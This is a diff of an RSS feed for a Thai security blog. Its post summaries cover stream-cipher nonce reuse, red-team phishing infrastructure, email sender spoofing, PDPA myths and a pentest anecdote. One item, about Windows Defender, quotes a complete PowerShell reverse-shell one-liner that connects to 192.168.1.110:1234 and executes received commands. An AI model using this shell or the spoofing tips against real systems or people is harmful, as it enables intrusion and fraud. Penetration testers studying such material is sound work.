@@ -5,27 +5,87 @@
     <link>https://suam.wtf/posts/</link>
     <description>Recent content in Posts on SUAM</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Tue, 30 Jun 2020 23:16:18 +0700</lastBuildDate>
+    <language>en</language>
+    <lastBuildDate>Thu, 03 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://suam.wtf/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 1</title>
+      <link>https://suam.wtf/posts/nonce-reuse-attack-on-stream-cipher/</link>
+      <pubDate>Thu, 03 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/nonce-reuse-attack-on-stream-cipher/</guid>
+      <description>ช่วงนี้ Trend การใช้งาน Stream cipher กำลังมาแรงมาก เนื่องจากความเร็วในการเข้ารหัสและความง่ายของตัว Algorithm อย่าง TLS 1.3 ก็หันมาใช้งาน Stream cipher เป็นหลักแล้ว เช่น AES-GCM และ ChaCha20
+อย่างไรก็ตามการใช้งาน Stream cipher มันจะมีข้อหนึ่งที่ต้องระวังมาก ๆ ๆ ๆ ๆ คือการใช้คู่ Nonce และ Key ซ้ำ ในการเข้ารหัสมากกว่า 1 รอบ (โครตบาป) จะเห็นได้จากช่องโหว่ ดัง ๆ มากมายที่ Impact เกิดจากการใช้งาน Nonce ซ้ำ เช่น KRACK Attacks บน WPA2 หรือ Forbidden Attack บน TLS
+Stream Cipher คือ ? ก่อนที่จะมาดูการโจมตี เรามาทำความรู้จักกับ Stream cipher กันก่อน ตัว Stream cipher จะเป็นการเข้ารหัสแบบ Symmetric key cipher แบบหนึ่ง คือ การเข้ารหัส และถอดรหัสจะใช้ Key เดียวกัน</description>
+    </item>
     
-	<atom:link href="https://suam.wtf/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Red Team Engagement: การขอ AWS ทำ Phishing Simulation และการทำ Infra ให้น่าเชื่อถือ</title>
+      <link>https://suam.wtf/posts/aws-removing-email-sending-limit-for-phishing-simulation/</link>
+      <pubDate>Mon, 03 Aug 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/aws-removing-email-sending-limit-for-phishing-simulation/</guid>
+      <description>การทำ Phishing simulation นั้นเป็นกิจกรรมซึ่งมีลักษณะคล้ายกับการปรุงอาหาร สูตรอาหารหนึ่งสูตรสามารถปรุงได้หลายวิธีการและสร้างความอร่อยได้ในหลากหลายรูปแบบ การทำ Phishing simulation ก็มีปัจจัยซึ่งถูกแอบซ่อนไว้อยู่หลายปัจจัยที่จะช่วยการันตีในความสำเร็จของปฏิบัติการโดยอาศัยการพึ่งพาผู้ใช้บริการให้น้อยที่สุด มีปฏิบัติการที่เสมือนจริงที่สุดตามลักษณะภัยคุกคามที่เป็นไปได้ที่ผู้ใช้บริการของเราจะเผชิญ และคงไว้ซึ่งความลับของปฏิบัติการให้มากที่สุด
+ปัจจัยที่มักได้รับความสนใจและความทุ่มเทเป็นอย่างสูงโดยเหล่า Red team มักจะล้อมอยู่ในประเด็นของการข้ามผ่านการตรวจจับและเฝ้าระวัง ซึ่งเราได้มีการพูดถึงไปบางส่วนแล้วในโพสต์ Red Team Engagement ที่ผ่านมา
+ ดูเทคนิคการทำ Phishing technique ให้แนบเนียนได้ที่โพสต์ Red Team Engagement: Phishing Techniques
+ อย่างไรก็ตามอีกหนึ่งปัจจัยที่มักถูกลืมหรือไม่ได้รับความสนใจมากเท่าไหร่นั้นคือชัยภูมิในการปฏิบัติการ หรือ Infrastructure ที่เราจะใช้ในการจำลองพฤติกรรมของภัยคุกคาม ซึ่งวันนี้เราจะมาพูดถึงทั้งในประเด็นของการเลือกและพัฒนาชัยภูมิให้เหมาะสม รวมไปถึงประเด็นในการใช้บริการของ AWS เป็นชัยภูมิในการจำลองการโจมตีครับ
+Battle of Reputation เมื่อพูดถึงประเด็นในเรื่องของ Infrastructure สำหรับการทำ Phishing simulation นั้น คำสำคัญซึ่งมีผลต่อความสำเร็จและความแนบเนียนของปฏิบัติการก็ยังคงเป็นคำเดิมๆ ตามตำรา Social engineering คือความน่าเชื่อถือ ระบบเฝ้าระวังและตรวจจับภัยคุกคามทางอีเมลมีการอาศัยปัจจัยอ้างอิงและการคำนวณทางสถิติมากมายเพื่อตัดสินว่าอีเมลที่ถูกซึ่งมาจากโดเมนใดโดเมนหนึ่งนั้นน่าจะเป็นอันตรายมากแค่ไหน บางส่วนของปัจจัยที่มักถูกใช้ในการช่วยระบบตัดสินใจนั้นได้แก่
+ แหล่งอ้างอิงโดเมน (Reference) ยิ่งโดเมนนี้มีการปรากฎในอินเตอร์เน็ต และมีกิจกรรมซึ่งเกี่ยวข้องกับโดเมนดังกล่าวตลอดเวลา ความเชื่อถือก็จะยิ่งมากขึ้น สถานะการถูก Blacklist ของโดเมนหรือเครือข่ายที่เกี่ยวข้องกับหมายเลขไอพีแอดเดรสของเรา ถ้าเคยมีประวัติไม่ดีมาก่อน ความน่าเชื่อถือจะยิ่งต่ำ อายุของโดเมน โดเมนซึ่งมีอายุน้อย พึ่งถูกจดใหม่ไม่นาน ก็จะถือว่ามีความน่าเชื่อถือต่ำ Top-level domain ในกลุ่มของ TLD นั้นแน่นอนว่ามีส่วนซึ่งราคาถูก จดทะเบียนได้ง่าย ไม่มีการตรวจสอบมากมายอยู่ หากโดเมนเนมของเราอยู่ในกลุ่มนี้ก็อาจได้รับความน่าเชื่อถือที่ต่ำตามไปด้วย เป็นโดเมนเนมในกลุ่มของอีเมลฟรีหรือแบบอีเมลชั่วคราวหรือไม่ ถ้าส่งมาจากบริการแบบ Disposal อีเมลของเราก็จะมีความน่าเชื่อถือที่ต่ำ การตั้งค่า SPF/DKIM/DMARC ถ้ามีการตั้งค่าที่เหมาะสม อุปกรณ์หรือระบบบางประเภทจะถือว่ามีความน่าเชื่อถือสูง โปรโตคอลสำหรับรับส่งอีเมล ยิ่งมีการใช้ TLS และการพิสูจน์ตัวตนที่ถูกต้อง ก็อาจได้ความน่าเชื่อถือที่สูงตาม  จากรายการด้านบน ประเด็นที่เราจะยกมาพูดถึงกันวันนี้จะเน้นไปที่เรื่องที่ 2 คือการเลือก Infrastructure ที่มีพื้นฐานและความน่าเชื่อถือดีตั้งแต่แรก เพื่อให้ลดความเสี่ยงที่จะถูก Blacklist ทั้ง Subnet ตั้งแต่ยังไม่เริ่มปฏิบัติการครับ</description>
+    </item>
     
+    <item>
+      <title>เรื่องเล่าของ 👉👩👈 | นี่มัน Pentest หรอคะ!?</title>
+      <link>https://suam.wtf/posts/the-story-of-gg-is-this-the-pentest/</link>
+      <pubDate>Wed, 22 Jul 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/the-story-of-gg-is-this-the-pentest/</guid>
+      <description>สวัสดีค่ะทุกคนนนน 😘 อันที่จริงน้องตั้งใจจะมีสาระในบล็อกแรก แต่ความเป็นจริงก็ไม่ค่อยได้อย่างที่คิด และก็ไม่ใช่เรื่องที่มีสาระเท่าไหร่ แต่ถึงจะเป็นอย่างนั้น มันกลับเป็นเรื่องที่จำเป็นต้องพูดถึงอย่างมากเมื่อมันเป็นเรื่องความปลอดภัยและการประเมินความปลอดภัยของแอปพลิเคชันและเว็บ
+เมื่อพูดถึงการประเมินว่าแอปพลิเคชันหรือเว็บปลอดภัยแค่ไหน เรามักจะนึกถึงคำว่า vulnerability assessement (VA) หรือการทำ pentest ใช่ไหมคะ ทั้งสองอย่างนี้เป็นสิ่งที่คล้ายกันแต่ก็ให้ผลลัพธ์ต่างกัน เพียงแต่ว่าสิ่งที่เรามักจะเห็นในวงการนี้คือการนำการประเมิน 2 แบบนี้มาใช้แทนกัน เช่น การขาย pentest แต่ดันทำเป็น VA ไปขาย! 😲 ซึ่งสร้างความเข้าใจผิดๆ ให้ลูกค้าว่าระบบนั้นไม่ปลอดภัยเพราะเจอช่องโหว่เยอะมากกกกก หรือปลอดภัยเพราะผล VA ไม่เจออะไรเลย (แต่ให้ที่อื่น pentest ต่อมันก็เจอนะ!?)
+ตัวอย่างนึงที่เราจะมาดูกันวันนี้คือสิ่งทีน้องเจอมาเองค่ะ เรื่องคือ บ ของน้องได้เป็น vendor เขียน website ให้กับ บ ที่หนึ่ง จากนั้้น บ นั้นได้มีการทำ internal pentest และเจอว่าเว็บในความโอบอุ้มดูแลของน้อง มีช่องโหว่ที่ร้ายแรงมากๆ อยู่ ผลถูกส่งมาใน Report ที่ได้จาก Ac _ _ _ _ ix พร้อมกับคอมเม้นให้แก้ไขด่วนๆๆ ตามรูปด้านล่างค่ะ
+สิ่งที่เห็นอยู่นี้คือรีพอร์ทช่องโหว่ Reflected XSS ที่ _ _ unet _ _ เจอใน Magento เราจะเห็น Ac _ _ _ _ ix ใช้วิธีสร้าง XSS payload แล้วเอามาเติมต่อท้าย URL ที่เราทดสอบ แล้วด้วยวิธีการบางอย่าง _ _ unet _ _ จะมีการหาว่า Payload ที่ใส่เข้าไปมีผลออกมามั้ย</description>
+    </item>
+    
+    <item>
+      <title>Red Team Engagement: Phishing Techniques</title>
+      <link>https://suam.wtf/posts/red-team-engagement-phishing-techniques/</link>
+      <pubDate>Mon, 06 Jul 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/red-team-engagement-phishing-techniques/</guid>
+      <description>โพสต์นี้เป็นอีกโพสต์หนึ่งซึ่งผมจะใช้มันเป็นโน้ตสั้น ๆ สำหรับทดสิ่งที่ได้รู้มาเผื่อซักวันนึงเราจะได้ใช้มันและก็หวังว่าคนอื่นจะได้รับประโยชน์เช่นกัน สำหรับเนื้อหาที่เราจะเลือกทดกันในวันนี้มาจาก SANS@MIC Webcast ในหัวข้อ Catch and release: phishing techniques for the good guys โดย Jan Kopřiva ครับ
+ ดาวโหลดสไลด์ประกอบการบรรยายหรือดู Webcast เต็มย้อนหลังได้ที่ SANS Webcast
+  คีย์เวิร์ดสำคัญในการทำ content ของ phishing operation ให้มีโอกาสสำเร็จสูงคือการเล่นกับคนผ่านปัจจัยซึ่งทำให้การวิเคราะห์และตัดสินใจด้วยเหตุและผลถูกบั่นทอนลง ปัจจัยเหล่านั้นมีได้หลากหลาย แต่ในการบรรยายนี้จะเน้นไปที่ปัจจัยอยู่ 3 ลักษณะคือ Known, Trustoworthy และ Urgent ทั้ง 3 ปัจจัยนี้หากใช้อย่างถูกต้องก็จะสามารถช่วยเพิ่มอัตราความสำเร็จได้เป็นอย่างดี ขั้นตอนการ Recon ยังคงเป็นขั้นตอนที่สำคัญเพื่อให้รู้ Defensive mechanism ที่เป้าหมายมี อาทิ ผู้ให้บริการอีเมลของเป้าหมายน่าจะมีความสามารถในการตรวจจับและป้องกันอีเมลปลอมได้ดีแค่ไหน หรือในฝั่งของเป้าหมายเองมีการตั้งค่า SPF/DKIM/DMARC ไว้อย่างไรเพื่อป้องการโจมตีในลักษณะนี้ เทคโนโลยีอย่าง SPF/DKIM/DMARC เป็นเทคโนโลยีซึ่งบางครั้งการเอามาใช้ให้ถูกต้องก็เป็นเรื่องที่ยาก ดังนั้นการนำผลลัพธ์จากการ Recon มาดูอาจช่วยให้เราพบอะไรที่น่าสนใจ และนำไปสู่การ bypass การป้องกันได้ ตัวอย่าง #56742 SPF whitelist of mandrill leads to email forgery เทคนิคการเล่นกับชื่อผู้ส่ง  ปลอมทั้งหมดผ่าน SMTP server ของเราเองแต่อาจเจอปัญหาในการตรวจสอบย้อนกลับ หรือปัญหาเกี่ยวกับ reputation ของ SMTP server ใช้ทริคปลอมอีเมลแอดเดรส เช่น ระบุ Sender address ให้มี First Last &amp;lt;fake@emai-address.</description>
+    </item>
+    
+    <item>
+      <title>5 Thailand&#39;s PDPA Myths</title>
+      <link>https://suam.wtf/posts/pdpa-myth/</link>
+      <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/pdpa-myth/</guid>
+      <description>Disclaimer: ผู้เขียนไม่ได้มีเจตนากล่าวหาหรือว่าร้ายบุคคลหรือนิติบุคคลใดทั้งสิ้น แค่ระบายเฉย ๆ จ้าาา
+ ตั้งแต่มี PDPA เกิดขึ้นมา ชีวิตในการทำงานในฐานะ Security Consultant ของผมยิ่งยากขึ้นทุกวัน ๆ (แต่ก็ยอมครับ เพราะผมได้ตังค์ :D)
+ซึ่งถ้าถามว่ามันยากขึ้นยังไงและเพราะอะไรนั้นผมบอกได้เลยว่าหลัก ๆ มาจากการที่หลาย ๆ คนยังมีความเข้าใจผิด ๆ เกี่ยวกับกฎหมายฉบับนี้อยู่หลายข้อ แต่ก็เข้าใจได้นะครับด้วยหลาย ๆ เหตุผล ซึ่งวันนี้จะเป็นฤกษ์งามยามดีที่เราจะมาปรับความเข้าใจในหลาย ๆ ประเด็นที่ยังเข้าใจผิดกันอยู่เกี่ยวกับ PDPA กันนะครับ
+Myth#1: ถ้าทำตาม PDPA แล้วระบบของเราจะไม่โดนแฮค ในความเป็นจริงนั้นเราต้องจัดให้มีมาตรการรักษาความปลอดภัยเพื่อป้องกันการโดนแฮคหรือเหตุการณ์ที่ไม่พึงประสงค์ที่อาจจะเกิดขึ้นกับข้อมูลส่วนบุคคลต่างหาก เพื่อเป็นการปฏิบัติตามหน้าที่ในฐานะผู้ควบคุมหรือผู้ประมวลผลข้อมูลส่วนบุคคลที่ระบุไว้ในกฎหมายตามมาตรา 37(1) และ 40(2)
+ มาตรา ๓๗ ผู้ควบคุมข้อมูลส่วนบุคคลมีหน้าที่ ดังต่อไปนี้
+(๑) จัดให้มีมาตรการรักษาความมั่นคงปลอดภัยที่เหมาะสม เพื่อป้องกันการสูญหาย เข้าถึง ใช้เปลี่ยนแปลง แก้ไข หรือเปิดเผยข้อมูลส่วนบุคคลโดยปราศจากอำนาจหรือโดยมิชอบ และต้องทบทวนมาตรการดังกล่าวเมื่อมีความจำเป็นหรือเมื่อเทคโนโลยีเปลี่ยนแปลงไปเพื่อให้มีประสิทธิภาพในการรักษาความมั่นคงปลอดภัยที่เหมาะสม ทั้งนี้ ให้เป็นไปตามมาตรฐานขั้นต่ำที่คณะกรรมการประกาศกำหนด
+มาตรา ๔๐ ผู้ประมวลผลข้อมูลส่วนบุคคลมีหน้าที่ ดังต่อไปนี้
+(๒) จัดให้มีมาตรการรักษาความมั่นคงปลอดภัยที่เหมาะสม เพื่อป้องกันการสูญหาย เข้าถึง ใช้ เปลี่ยนแปลง แก้ไข หรือเปิดเผยข้อมูลส่วนบุคคลโดยปราศจากอำนาจหรือโดยมิชอบ รวมทั้งแจ้งให้ผู้ควบคุมข้อมูลส่วนบุคคลทราบถึงเหตุการณ์ละเมิดข้อมูลส่วนบุคคลที่เกิดขึ้น</description>
+    </item>
     
     <item>
       <title>What The Fuck Do You Want Windows Defender?</title>
       <link>https://suam.wtf/posts/wtf-do-you-want-windows-defender/</link>
-      <pubDate>Tue, 30 Jun 2020 23:16:18 +0700</pubDate>
+      <pubDate>Tue, 30 Jun 2020 00:00:00 +0000</pubDate>
       
       <guid>https://suam.wtf/posts/wtf-do-you-want-windows-defender/</guid>
       <description>เรื่องของเรื่องคือ ผมพยายามหา Powershell Script สั้น ๆ ที่ใช้สำหรับทำ Reverse Shell มาใช้สำหรับทำ Pentest ผมไปเจอตัวหนึ่งของคุณ @nikhil_mitt โดยมีหน้าตาประมาณนี้ครับ
-$client = New-Object System.Net.Sockets.TCPClient(&amp;#34;192.168.1.110&amp;#34;,1234); $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String ); $sendback2 = $sendback + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close(); เต็ม ๆ อ่านที่ Link นี้นะครับ
+$client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.1.110&amp;quot;,1234); $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String ); $sendback2 = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close();  เต็ม ๆ อ่านที่ Link นี้นะครับ
 ผมชอบมากเลยครับเพราะว่าหลังจากเอาไป Minify, Encode และทำเป็น One Line แล้วมันสั้นดี จะได้ประมาณนี้ครับ</description>
     </item>
     
     <item>
       <title>Create a Blog Post with Hugo</title>
       <link>https://suam.wtf/posts/create-a-blog-post-with-hugo/</link>
-      <pubDate>Tue, 14 Jan 2020 01:15:59 +0700</pubDate>
+      <pubDate>Tue, 14 Jan 2020 00:00:00 +0000</pubDate>
       
       <guid>https://suam.wtf/posts/create-a-blog-post-with-hugo/</guid>
       <description>In this post, I will present you a short introduction on how to create a blog post, from the the installation of Hugo to publishing your article.
